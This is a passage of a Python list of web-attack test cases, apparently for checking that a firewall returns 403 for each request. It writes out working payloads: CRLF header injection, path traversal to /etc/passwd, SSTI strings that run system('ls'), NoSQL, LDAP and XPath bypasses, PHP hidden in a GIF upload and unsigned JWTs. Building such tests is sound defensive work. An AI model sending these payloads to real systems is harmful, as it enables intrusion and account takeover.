     ("HTTP Response Splitting", f"{TARGET_URL}/?header=X-Custom-Header: malicious%0aContent-Type: text/html", "HTTP Response Splitting (Level 3) - LF Injection", 403, None, None),
    ("HTTP Response Splitting", f"{TARGET_URL}/?header=Set-Cookie: test=malicious%0d%0aContent-Type: text/html", "HTTP Response Splitting (Level 4) - Set-Cookie Injection", 403, None, None),
    ("HTTP Response Splitting", f"{TARGET_URL}/?header=Location: https://evil.com%0d%0aContent-Type: text/html", "HTTP Response Splitting (Level 5) - Location Injection", 403, None, None),
    ("HTTP Response Splitting", f"{TARGET_URL}/", "HTTP Response Splitting (Header Level 1) - Header Injection", 403, {"X-Custom-Header": "malicious\r\nContent-Type: text/html"}, None),
    ("HTTP Response Splitting", f"{TARGET_URL}/", "HTTP Response Splitting (Header Level 2) - Header with CRLF", 403, {"X-Custom-Header": "malicious%0d%0aContent-Type: text/html"}, None),
    ("HTTP Response Splitting", f"{TARGET_URL}/", "HTTP Response Splitting (Header Level 3) - Location Injection", 403, {"Location": "https://evil.com%0d%0aContent-Type: text/html"}, None),
    ("HTTP Response Splitting", f"{TARGET_URL}/", "HTTP Response Splitting (Header Level 4) -  Set-Cookie injection", 403, {"Set-Cookie": "test=malicious%0d%0aContent-Type: text/html"}, None),
    ("HTTP Response Splitting", f"{TARGET_URL}/", "HTTP Response Splitting (Header Level 5) - Custom header with CRLF", 403, {"X-Custom-Header": "malicious%0d%0aX-Custom-Header2: test"}, None),
    ("HTTP Response Splitting", f"{TARGET_URL}/", "HTTP Response Splitting (Cookie Level 1) - Cookie Injection", 403, {"Cookie": "test=malicious\r\nContent-Type: text/html"}, None),
    ("HTTP Response Splitting", f"{TARGET_URL}/", "HTTP Response Splitting (Cookie Level 2) - Cookie with CRLF", 403, {"Cookie": "test=malicious%0d%0aContent-Type: text/html"}, None),
    ("HTTP Response Splitting", f"{TARGET_URL}/", "HTTP Response Splitting (Cookie Level 3) - Multiple Cookies", 403, {"Cookie": "test1=value1; test2=malicious%0d%0aContent-Type: text/html"}, None),
    ("HTTP Response Splitting", f"{TARGET_URL}/", "HTTP Response Splitting (Cookie Level 4) - Custom cookie with CRLF", 403, {"Cookie": "test=value1%0d%0aSet-Cookie: test2=value2"}, None),
   ("HTTP Response Splitting", f"{TARGET_URL}/", "HTTP Response Splitting (Cookie Level 5) - Double Set-Cookie Injection", 403, {"Cookie": "test=malicious; Set-Cookie: test2=malicious%0d%0aContent-Type: text/html"}, None),


    # Insecure Direct Object References (IDOR)
    ("IDOR", f"{TARGET_URL}/user/1", "IDOR (Level 1) - Basic IDOR", 403, None, None),
    ("IDOR", f"{TARGET_URL}/user/2", "IDOR (Level 2) - Increment ID", 403, None, None),
    ("IDOR", f"{TARGET_URL}/user/abc", "IDOR (Level 3) - Non-Numeric ID", 403, None, None),
    ("IDOR", f"{TARGET_URL}/user/-1", "IDOR (Level 4) - Negative ID", 403, None, None),
    ("IDOR", f"{TARGET_URL}/user/0", "IDOR (Level 5) - Zero ID", 403, None, None),
    ("IDOR", f"{TARGET_URL}/user/1234567890", "IDOR (Level 6) - Large ID", 403, None, None),
    ("IDOR", f"{TARGET_URL}/user/..%2fetc%2fpasswd", "IDOR (Level 7) - Path Traversal in ID", 403, None, None),
    ("IDOR", f"{TARGET_URL}/admin/user/1", "IDOR (Level 8) - Different resource", 403, None, None),
    ("IDOR", f"{TARGET_URL}/image/1.jpg", "IDOR (Level 9) - Accessing Image", 403, None, None),
    ("IDOR", f"{TARGET_URL}/download/report_123.pdf", "IDOR (Level 10) - Downloading Report", 403, None, None),
    ("IDOR", f"{TARGET_URL}/view_invoice?id=ABC", "IDOR (Level 11) - Alphanumeric ID", 403, None, None),
    ("IDOR", f"{TARGET_URL}/settings/profile.json", "IDOR (Level 12) - Accessing JSON Data", 403, None, None),
     ("IDOR", f"{TARGET_URL}/api/v1/resource/1", "IDOR (Level 13) - REST API IDOR", 403, None, None),
     ("IDOR", f"{TARGET_URL}/file?id=1", "IDOR (Level 14) - File Download IDOR", 403, None, None),
     ("IDOR", f"{TARGET_URL}/group/1/members", "IDOR (Level 15) - Group Member IDOR", 403, None, None),
     ("IDOR", f"{TARGET_URL}/order/123/items", "IDOR (Level 16) - Order Items IDOR", 403, None, None),
    ("IDOR", f"{TARGET_URL}/document?id=1&type=pdf", "IDOR (Level 17) - IDOR with Type parameter", 403, None, None),
    ("IDOR", f"{TARGET_URL}/product?id=123&variant=red", "IDOR (Level 18) - IDOR with Variant parameter", 403, None, None),
    ("IDOR", f"{TARGET_URL}/comment/12345", "IDOR (Level 19) - Comment IDOR", 403, None, None),
     ("IDOR", f"{TARGET_URL}/api/items?id=1", "IDOR (Level 20) - Query Parameter IDOR", 403, None, None),
      ("IDOR", f"{TARGET_URL}/user/1/", "IDOR (Level 21) - Trailing Slash IDOR", 403, None, None),
     ("IDOR", f"{TARGET_URL}/admin/user/1", "IDOR (Level 22) - Admin user IDOR", 403, None, None),
     ("IDOR", f"{TARGET_URL}/dashboard?id=123", "IDOR (Level 23) -  dashboard IDOR", 403, None, None),
    ("IDOR", f"{TARGET_URL}/account/123", "IDOR (Level 24) -  Account IDOR", 403, None, None),
     ("IDOR", f"{TARGET_URL}/post/1", "IDOR (Level 25) - Post IDOR", 403, None, None),
     ("IDOR", f"{TARGET_URL}/video/1", "IDOR (Level 26) -  Video IDOR", 403, None, None),
     ("IDOR", f"{TARGET_URL}/blog/123", "IDOR (Level 27) - Blog Post IDOR", 403, None, None),
    ("IDOR", f"{TARGET_URL}/forum/123/thread", "IDOR (Level 28) - Forum Thread IDOR", 403, None, None),
     ("IDOR", f"{TARGET_URL}/task?id=1", "IDOR (Level 29) - Task IDOR", 403, None, None),
    ("IDOR", f"{TARGET_URL}/note/123", "IDOR (Level 30) -  Note IDOR", 403, None, None),

    # Clickjacking Tests
    ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 1) - Basic Iframe Test", 403, None, "<iframe src=\"{TARGET_URL}\"></iframe>"),
    ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 2) - Double Iframe Test", 403, None, "<iframe src=\"{TARGET_URL}\"><iframe src=\"{TARGET_URL}\"></iframe></iframe>"),
    ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 3) - Object Tag Test", 403, None, "<object data=\"{TARGET_URL}\"></object>"),
    ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 4) - Embed Tag Test", 403, None, "<embed src=\"{TARGET_URL}\">"),
    ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 5) - Form Tag Test", 403, None, "<form action=\"{TARGET_URL}\"><input type=\"submit\" value=\"Click Me\"></form>"),
    ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 6) - Base Tag Test", 403, None, "<base href=\"{TARGET_URL}\"><a href=\"\">Click Me</a>"),
    ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 7) - Iframe with sandbox attribute", 403, None, "<iframe src=\"{TARGET_URL}\" sandbox></iframe>"),
     ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 8) - Iframe with allow attribute", 403, None, "<iframe src=\"{TARGET_URL}\" allow=\"fullscreen\"></iframe>"),
     ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 9) -  Iframe with referrerpolicy attribute", 403, None, "<iframe src=\"{TARGET_URL}\" referrerpolicy=\"no-referrer\"></iframe>"),
    ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 10) -  Frame tag", 403, None, "<frame src=\"{TARGET_URL}\"></frame>"),
    ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 11) -  Frameset tag", 403, None, "<frameset><frame src=\"{TARGET_URL}\"></frameset>"),
    ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 12) -  A tag with target blank", 403, None, "<a href=\"{TARGET_URL}\" target=\"_blank\">Click Me</a>"),
    ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 13) -  A tag with target top", 403, None, "<a href=\"{TARGET_URL}\" target=\"_top\">Click Me</a>"),
    ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 14) -  Iframe with long URL", 403, None, "<iframe src=\"{TARGET_URL}?param=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"></iframe>"),
   ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 15) -  Iframe with different domain", 403, None, "<iframe src=\"http://attacker.com\"></iframe>"),

    # Cross-Site Request Forgery (CSRF) Tests
    ("CSRF", f"{TARGET_URL}/transfer.php", "CSRF (Level 1) - Basic GET Request", 403, None, "<img src='{TARGET_URL}/transfer.php?amount=100&to=victim'>"),
    ("CSRF", f"{TARGET_URL}/transfer.php", "CSRF (Level 2) - Basic POST Request", 403, None, '<form action="{TARGET_URL}/transfer.php" method="POST"><input type="hidden" name="amount" value="100"><input type="hidden" name="to" value="victim"><input type="submit" value="Transfer"></form>'),
    ("CSRF", f"{TARGET_URL}/change_email.php", "CSRF (Level 3) - POST with JSON", 403, {'Content-Type': 'application/json'}, '{"email": "attacker@example.com"}'),
    ("CSRF", f"{TARGET_URL}/change_password.php", "CSRF (Level 4) - Change Password", 403, None, '<form action="{TARGET_URL}/change_password.php" method="POST"><input type="hidden" name="old_password" value="current"><input type="hidden" name="new_password" value="new"><input type="submit" value="Change Password"></form>'),
    ("CSRF", f"{TARGET_URL}/transfer.php", "CSRF (Level 5) - GET with Array Parameter", 403, None, "<img src='{TARGET_URL}/transfer.php?amounts[]=100&to=victim'>"),
    ("CSRF", f"{TARGET_URL}/change_settings", "CSRF (Level 6) - POST with XML", 403, {'Content-Type': 'application/xml'}, '<settings><email>attacker@example.com</email></settings>'),
    ("CSRF", f"{TARGET_URL}/upload_avatar", "CSRF (Level 7) - File Upload (Without Token)", 403, {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW'}, '------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="avatar"; filename="evil.jpg"\r\nContent-Type: image/jpeg\r\n\r\nFAKE_IMAGE_CONTENT\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n'),
    ("CSRF", f"{TARGET_URL}/delete_account", "CSRF (Level 8) - Delete account", 403, None, '<form action="{TARGET_URL}/delete_account" method="POST"><input type="submit" value="Delete Account"></form>'),
     ("CSRF", f"{TARGET_URL}/logout", "CSRF (Level 9) - Logout CSRF", 403, None, "<img src='{TARGET_URL}/logout'>"),
      ("CSRF", f"{TARGET_URL}/add_product", "CSRF (Level 10) - Add Product CSRF", 403, None, '<form action="{TARGET_URL}/add_product" method="POST"><input type="hidden" name="product_name" value="Evil Product"><input type="hidden" name="price" value="999"><input type="submit" value="Add"></form>'),
      ("CSRF", f"{TARGET_URL}/add_to_cart", "CSRF (Level 11) - Add to Cart CSRF", 403, None, '<form action="{TARGET_URL}/add_to_cart" method="POST"><input type="hidden" name="product_id" value="123"><input type="hidden" name="quantity" value="1"><input type="submit" value="Add"></form>'),
     ("CSRF", f"{TARGET_URL}/submit_review", "CSRF (Level 12) - Submit Review CSRF", 403, {'Content-Type': 'application/json'}, '{"product_id": 1, "rating": 1, "comment": "malicious review"}'),
     ("CSRF", f"{TARGET_URL}/update_profile", "CSRF (Level 13) - Profile Update CSRF", 403, {'Content-Type': 'application/json'}, '{"name": "Attacker", "address": "Evil address"}'),
    ("CSRF", f"{TARGET_URL}/transfer.php", "CSRF (Level 14) - POST with URL encoded body", 403, {'Content-Type': 'application/x-www-form-urlencoded'}, "amount=100&to=victim"),
     ("CSRF", f"{TARGET_URL}/subscribe", "CSRF (Level 15) - Subscribe CSRF", 403, None, '<form action="{TARGET_URL}/subscribe" method="POST"><input type="hidden" name="email" value="attacker@example.com"><input type="submit" value="Subscribe"></form>'),

    # Server-Side Template Injection (SSTI) Tests
    ("SSTI", f"{TARGET_URL}/?name={{7*7}}", "SSTI (Level 1) - Basic Math Expression", 403, None, None),
    ("SSTI", f"{TARGET_URL}/?name=${{7*7}}", "SSTI (Level 2) - Alternate Math Expression", 403, None, None),
    ("SSTI", f"{TARGET_URL}/?name=<% 7*7 %>", "SSTI (Level 3) - JSP-like Expression", 403, None, None),
    ("SSTI", f"{TARGET_URL}/?name={{config}}", "SSTI (Level 5) - Accessing Configuration", 403, None, None),
    ("SSTI", f"{TARGET_URL}/", "SSTI (Header Level 1) - Basic Expression in Header", 403, {"X-Custom-Name": "{{7*7}}"}, None),
   ("SSTI", f"{TARGET_URL}/?name={{''.__class__.__mro__[1].__subclasses__()}}", "SSTI (Level 6) - Class access in Jinja2", 403, None, None),
    ("SSTI", f"{TARGET_URL}/?name=${{self.environ}}", "SSTI (Level 7) - Environment access in Flask/Jinja2", 403, None, None),
    ("SSTI", f"{TARGET_URL}/?name={{''.getClass().getResource(\"/\")}}", "SSTI (Level 8) - Class access in Velocity", 403, None, None),
     ("SSTI", f"{TARGET_URL}/?name=$!{{7*7}}", "SSTI (Level 9) - Velocity Expression", 403, None, None),
     ("SSTI", f"{TARGET_URL}/?name=${{T(System).getenv()}}", "SSTI (Level 10) - System access in Spring/Thymeleaf", 403, None, None),
    ("SSTI", f"{TARGET_URL}/", "SSTI (Header Level 2) -  SSTI in User-Agent", 403, {"User-Agent": "{{7*7}}"}, None),
    ("SSTI", f"{TARGET_URL}/", "SSTI (Header Level 3) - SSTI with env vars", 403, {"X-Custom-Env": "{{env}}"}, None),
    ("SSTI", f"{TARGET_URL}/?name=#{7*7}", "SSTI (Level 11) - Thymeleaf Math Expression", 403, None, None),
     ("SSTI", f"{TARGET_URL}/?name=${{#numbers.sequence(0, 10)}}", "SSTI (Level 12) - Thymeleaf Number Sequence", 403, None, None),
      ("SSTI", f"{TARGET_URL}/?name=$!{{7*7}}", "SSTI (Level 13) - Alternate Velocity Syntax", 403, None, None),
      ("SSTI", f"{TARGET_URL}/?name={{().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__['system']('ls')}}", "SSTI (Level 14) - Python Code Execution", 403, None, None),
     ("SSTI", f"{TARGET_URL}/?name=<% runtime.exec('ls') %>", "SSTI (Level 15) - JSP Code Execution", 403, None, None),

    # Mass Assignment Tests
    ("Mass Assignment", f"{TARGET_URL}/profile/update", "Mass Assignment (Level 1) - Updating Admin Field", 403, {"Content-Type": "application/json"}, '{"isAdmin": true, "username": "test"}'),
    ("Mass Assignment", f"{TARGET_URL}/profile/update", "Mass Assignment (Level 2) - Updating Credit Limit", 403, {"Content-Type": "application/json"}, '{"creditLimit": 99999, "username": "test"}'),
    ("Mass Assignment", f"{TARGET_URL}/settings/update", "Mass Assignment (Level 3) - Nested Object Update", 403, {"Content-Type": "application/json"}, '{"profile": {"isAdmin": true}, "username": "test"}'),
    ("Mass Assignment", f"{TARGET_URL}/settings/update", "Mass Assignment (Level 4) - Array Update", 403, {"Content-Type": "application/json"}, '{"permissions": ["admin", "delete"], "username": "test"}'),
    ("Mass Assignment", f"{TARGET_URL}/update", "Mass Assignment (Level 5) - Updating Internal Field", 403, {"Content-Type": "application/json"}, '{"internalData": {"secret": "secretvalue"}, "username": "test"}'),
    ("Mass Assignment", f"{TARGET_URL}/update", "Mass Assignment (Level 6) - Updating Role", 403, {"Content-Type": "application/json"}, '{"role": "admin", "username": "test"}'),
      ("Mass Assignment", f"{TARGET_URL}/update", "Mass Assignment (Level 7) - Updating Status", 403, {"Content-Type": "application/json"}, '{"status": "approved", "username": "test"}'),
      ("Mass Assignment", f"{TARGET_URL}/update", "Mass Assignment (Level 8) - Updating Password", 403, {"Content-Type": "application/json"}, '{"password": "newpassword", "username": "test"}'),
     ("Mass Assignment", f"{TARGET_URL}/update", "Mass Assignment (Level 9) - Updating Created At", 403, {"Content-Type": "application/json"}, '{"created_at": "2023-11-21", "username": "test"}'),
      ("Mass Assignment", f"{TARGET_URL}/update", "Mass Assignment (Level 10) - Updating Email", 403, {"Content-Type": "application/json"}, '{"email": "attacker@example.com", "username": "test"}'),
      ("Mass Assignment", f"{TARGET_URL}/update", "Mass Assignment (Level 11) - Updating Session Data", 403, {"Content-Type": "application/json"}, '{"session": {"valid": true}, "username": "test"}'),
     ("Mass Assignment", f"{TARGET_URL}/update", "Mass Assignment (Level 12) - Updating token", 403, {"Content-Type": "application/json"}, '{"token": "secrettoken", "username": "test"}'),

    # NoSQL Injection Tests
    ("NoSQL Injection", f"{TARGET_URL}/?search[$gt]=null", "NoSQLi (Level 1) - MongoDB $gt Operator", 403, None, None),
    ("NoSQL Injection", f"{TARGET_URL}/?search[$ne]=null", "NoSQLi (Level 2) - MongoDB $ne Operator", 403, None, None),
    ("NoSQL Injection", f"{TARGET_URL}/?search[$regex]=.*", "NoSQLi (Level 3) - MongoDB $regex Operator", 403, None, None),
    ("NoSQL Injection", f"{TARGET_URL}/?search=')", "NoSQLi (Level 4) - Basic String Injection", 403, None, None),
    ("NoSQL Injection", f"{TARGET_URL}/?search[$gt]=1", "NoSQLi (Level 5) - MongoDB $gt with Number", 403, None, None),
    ("NoSQL Injection", f"{TARGET_URL}/?search[$where]= '1' == '1'", "NoSQLi (Level 6) - MongoDB $where Operator", 403, None, None),
    ("NoSQL Injection", f"{TARGET_URL}/?search[$or][0][username]=admin", "NoSQLi (Level 7) - MongoDB $or Operator", 403, None, None),
    ("NoSQL Injection", f"{TARGET_URL}/?search[$and][0][username]=admin", "NoSQLi (Level 8) - MongoDB $and Operator", 403, None, None),
      ("NoSQL Injection", f"{TARGET_URL}/?search[$in][0]=admin", "NoSQLi (Level 9) - MongoDB $in Operator", 403, None, None),
     ("NoSQL Injection", f"{TARGET_URL}/?search[$nin][0]=admin", "NoSQLi (Level 10) - MongoDB $nin Operator", 403, None, None),
      ("NoSQL Injection", f"{TARGET_URL}/?search[$exists]=true", "NoSQLi (Level 11) - MongoDB $exists Operator", 403, None, None),
    ("NoSQL Injection", f"{TARGET_URL}/?search[$type]=string", "NoSQLi (Level 12) - MongoDB $type Operator", 403, None, None),
    ("NoSQL Injection", f"{TARGET_URL}/?search[$jsonSchema][properties][username][type]=string", "NoSQLi (Level 13) - MongoDB $jsonSchema Operator", 403, None, None),
     ("NoSQL Injection", f"{TARGET_URL}/?search[$not][$eq]=1", "NoSQLi (Level 14) - MongoDB $not Operator", 403, None, None),
    ("NoSQL Injection", f"{TARGET_URL}/?search[$mod][0]=2&search[$mod][1]=0", "NoSQLi (Level 15) - MongoDB $mod operator", 403, None, None),
    ("NoSQL Injection", f"{TARGET_URL}/", "NoSQLi (Header Level 1) - Injection in Header", 403, {"X-Search-Param": "[$gt]=null"}, None),
    ("NoSQL Injection", f"{TARGET_URL}/", "NoSQLi (Header Level 2) - Complex Injection", 403, {"X-Search-Param": '{"$gt": 1}'}, None),
    ("NoSQL Injection", f"{TARGET_URL}/", "NoSQLi (Header Level 3) - Header with $regex", 403, {"X-Search-Param": '{"$regex":".*"}'}, None),
     ("NoSQL Injection", f"{TARGET_URL}/", "NoSQLi (Header Level 4) - Header with $where", 403, {"X-Search-Param": '{"$where":"1==1"}'}, None),
    ("NoSQL Injection", f"{TARGET_URL}/", "NoSQLi (Header Level 5) - Header with $or", 403, {"X-Search-Param": '{"$or":[{"username":"admin"}]}'}, None),

    # XPath Injection Tests
    ("XPath Injection", f"{TARGET_URL}/?user=admin' or '1'='1", "XPath (Level 1) - Basic OR Bypass", 403, None, None),
    ("XPath Injection", f"{TARGET_URL}/?user=admin' and '1'='2", "XPath (Level 2) - Basic AND Bypass", 403, None, None),
    ("XPath Injection", f"{TARGET_URL}/?user=//users/user[@name='admin']", "XPath (Level 3) - Direct Path Query", 403, None, None),
    ("XPath Injection", f"{TARGET_URL}/?user=//users/user[username='admin' and password='password']", "XPath (Level 4) - Credential Check", 403, None, None),
    ("XPath Injection", f"{TARGET_URL}/?user=//users/user[contains(name(),'adm')]", "XPath (Level 5) - Contains Function", 403, None, None),
      ("XPath Injection", f"{TARGET_URL}/?user=//users/user[starts-with(name(),'adm')]", "XPath (Level 6) - Starts-with Function", 403, None, None),
    ("XPath Injection", f"{TARGET_URL}/?user=//users/user[text()='admin']", "XPath (Level 7) - Text Function", 403, None, None),
      ("XPath Injection", f"{TARGET_URL}/?user=//users/user[position()=1]", "XPath (Level 8) - Position Function", 403, None, None),
    ("XPath Injection", f"{TARGET_URL}/?user=//users/user[last()]", "XPath (Level 9) - Last Function", 403, None, None),
    ("XPath Injection", f"{TARGET_URL}/?user=//users/user[not(name()='user1')]", "XPath (Level 10) - Not Function", 403, None, None),
    ("XPath Injection", f"{TARGET_URL}/", "XPath (Header Level 1) - Injection in Header", 403, {"X-User-Search": "' or '1'='1"}, None),
    ("XPath Injection", f"{TARGET_URL}/", "XPath (Header Level 2) - Complex Query", 403, {"X-User-Search": "//users/user[contains(name(),'adm')]"}, None),
    ("XPath Injection", f"{TARGET_URL}/", "XPath (Header Level 3) - Header with Attribute", 403, {"X-User-Search": "//users/user[@id='1']"}, None),
    ("XPath Injection", f"{TARGET_URL}/", "XPath (Header Level 4) - Header with multiple functions", 403, {"X-User-Search": "//users/user[starts-with(name(),'adm') and contains(name(),'1')]"}, None),
     ("XPath Injection", f"{TARGET_URL}/", "XPath (Header Level 5) - Header with wildcard", 403, {"X-User-Search": "//users/user[name()='*']"}, None),

    # LDAP Injection Tests
    ("LDAP Injection", f"{TARGET_URL}/?user=*)((userPassword=*)", "LDAP (Level 1) - Basic Bypass", 403, None, None),
    ("LDAP Injection", f"{TARGET_URL}/?user=admin)(&)", "LDAP (Level 2) - AND Injection", 403, None, None),
    ("LDAP Injection", f"{TARGET_URL}/?user=*)(objectClass=*)", "LDAP (Level 3) - Retrieve All Objects", 403, None, None),
    ("LDAP Injection", f"{TARGET_URL}/?user=(|(uid=admin)(cn=*))", "LDAP (Level 4) - OR Bypass", 403, None, None),
     ("LDAP Injection", f"{TARGET_URL}/?user=(uid=admin)(!(userPassword=*))", "LDAP (Level 5) - NOT Operator", 403, None, None),
     ("LDAP Injection", f"{TARGET_URL}/?user=(|(uid=*)(sn=*))", "LDAP (Level 6) - Retrieve with OR", 403, None, None),
     ("LDAP Injection", f"{TARGET_URL}/?user=(&(objectClass=user)(uid=admin))", "LDAP (Level 7) - AND Filter", 403, None, None),
    ("LDAP Injection", f"{TARGET_URL}/", "LDAP (Header Level 1) - Injection in Header", 403, {"X-User-Filter": "*)((userPassword=*)"}, None),
     ("LDAP Injection", f"{TARGET_URL}/", "LDAP (Header Level 2) - Complex Filter", 403, {"X-User-Filter": "(objectClass=*)(uid=admin)"}, None),
    ("LDAP Injection", f"{TARGET_URL}/", "LDAP (Header Level 3) - Header with wildcards", 403, {"X-User-Filter": "(cn=*)"}, None),
    ("LDAP Injection", f"{TARGET_URL}/", "LDAP (Header Level 4) -  Header with OR", 403, {"X-User-Filter": "(|(uid=admin)(sn=*))"}, None),
    ("LDAP Injection", f"{TARGET_URL}/", "LDAP (Header Level 5) - Header with nested filters", 403, {"X-User-Filter": "(&(objectClass=user)(|(uid=admin)(sn=admin)))"}, None),
     

    # XML Injection (Other than XXE)
    ("XML Injection", f"{TARGET_URL}/?data=<user><name>test</name></user>", "XMLi (Level 1) - Basic Structure", 403, None, None),
    ("XML Injection", f"{TARGET_URL}/?data=<user><name><![CDATA[<script>alert(1)</script>]]></name></user>", "XMLi (Level 2) - CDATA Injection", 403, None, None),
    ("XML Injection", f"{TARGET_URL}/?data=<user><name>attacker</name><isAdmin>true</isAdmin></user>", "XMLi (Level 3) - Privilege Escalation", 403, None, None),
    ("XML Injection", f"{TARGET_URL}/?data=<user><name>test</name><address><a>evil</a></address></user>", "XMLi (Level 4) - Nested Element Injection", 403, None, None),
    ("XML Injection", f"{TARGET_URL}/?data=<user><name>test</name><maliciousAttribute evil='true' /></user>", "XMLi (Level 5) - Malicious Attribute", 403, None, None),
    ("XML Injection", f"{TARGET_URL}/?data=<user><name>test</name><comment><!--malicious--></comment></user>", "XMLi (Level 6) - Malicious comment", 403, None, None),
     ("XML Injection", f"{TARGET_URL}/?data=<user name='test' />", "XMLi (Level 7) - Attribute Injection", 403, None, None),
     ("XML Injection", f"{TARGET_URL}/?data=<user><?php phpinfo(); ?></user>", "XMLi (Level 8) - XML with PHP", 403, None, None),
    ("XML Injection", f"{TARGET_URL}/", "XMLi (Header Level 1) - XML in Header", 403, {"Content-Type": "application/xml"}, "<user><name>test</name></user>"),
    ("XML Injection", f"{TARGET_URL}/", "XMLi (Header Level 2) - Injecting Attributes", 403, {"Content-Type": "application/xml"}, "<user name=\"test\" isAdmin=\"true\"/>"),
    ("XML Injection", f"{TARGET_URL}/", "XMLi (Header Level 3) - Header with comment injection", 403, {"Content-Type": "application/xml"}, "<user><name>test</name><comment><!--malicious--></comment></user>"),
    ("XML Injection", f"{TARGET_URL}/", "XMLi (Header Level 4) - Header with Nested element", 403, {"Content-Type": "application/xml"}, "<user><name>test</name><address><a>evil</a></address></user>"),
    ("XML Injection", f"{TARGET_URL}/", "XMLi (Header Level 5) - Header with malicious attribute", 403, {"Content-Type": "application/xml"}, "<user><name>test</name><maliciousAttribute evil='true' /></user>"),


    # File upload
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 1) - Malicious .php Upload", 403, None, "FAKE_PHP_CONTENT"),
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 2) - Double Extension .php.jpg", 403, None, "FAKE_IMAGE_CONTENT"),
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 3) - SVG with embedded script", 403, None, "<svg><script>alert(1)</script></svg>"),
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 4) - .htaccess to allow PHP in images", 403, None, "FAKE_HTACCESS_CONTENT"),
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 5) - Shell script", 403, None, "FAKE_SHELL_CONTENT"),
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 6) - Malicious PDF", 403, None, "FAKE_PDF_CONTENT"),
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 7) - Double extension .php.txt", 403, None, "FAKE_TEXT_CONTENT"),
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 8) - PHP code in GIF", 403, None, "GIF89a<?php phpinfo(); ?>"),
     ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 9) -  Malicious .jsp", 403, None, "FAKE_JSP_CONTENT"),
      ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 10) -  Malicious .asp", 403, None, "FAKE_ASP_CONTENT"),
      ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 11) -  Malicious .aspx", 403, None, "FAKE_ASPX_CONTENT"),
      ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 12) -  Malicious .pl", 403, None, "FAKE_PERL_CONTENT"),
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 13) -  Malicious .py", 403, None, "FAKE_PYTHON_CONTENT"),
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 14) - Malicious .js", 403, None, "FAKE_JS_CONTENT"),
      ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 15) -  Malicious .html", 403, None, "<html<script>alert(1)</script></html>"),


    # JWT
    ("JWT", f"{TARGET_URL}/api", "JWT (Level 1) - None Algorithm Attack", 403, {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoicm9vdCJ9."}, None),
    ("JWT", f"{TARGET_URL}/api", "JWT (Level 2) - HS256 with Public Key Confusion", 403, {"Authorization": "Bearer eyJhbGciOiAiSFMyNTYiLCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoicm9vdCJ9.signature"}, None),
    ("JWT", f"{TARGET_URL}/api", "JWT (Level 3) - Algorithm Confusion with JWK", 403, {"Authorization": "Bearer tampered_jwt"}, None),
    ("JWT", f"{TARGET_URL}/api", "JWT (Level 4) - Missing Signature", 403, {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."}, None),
    ("JWT", f"{TARGET_URL}/api", "JWT (Level 5) - RS256 with Public Key Confusion", 403, {"Authorization": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9vdCJ9.signature"}, None),
     ("JWT", f"{TARGET_URL}/api", "JWT (Level 6) - HS256 with empty secret", 403, {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9vdCJ9."}, None),
